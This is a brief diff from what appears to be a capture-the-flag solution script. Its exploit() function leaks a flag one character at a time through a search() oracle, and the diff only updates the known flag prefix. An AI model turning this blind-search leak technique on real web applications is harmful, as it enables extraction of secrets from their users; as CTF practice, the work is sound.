@@ -27,7 +27,7 @@
 
     async function exploit() {
         let str = "0123456789abcdef}";
-        let FLAG = "DH{22d1445ad68";
+        let FLAG = "DH{22d1445ad68e194e044a16";
         while(!FLAG.includes("}")) {
             for(let ch of str) {
                 if(await search(FLAG+ch)) {
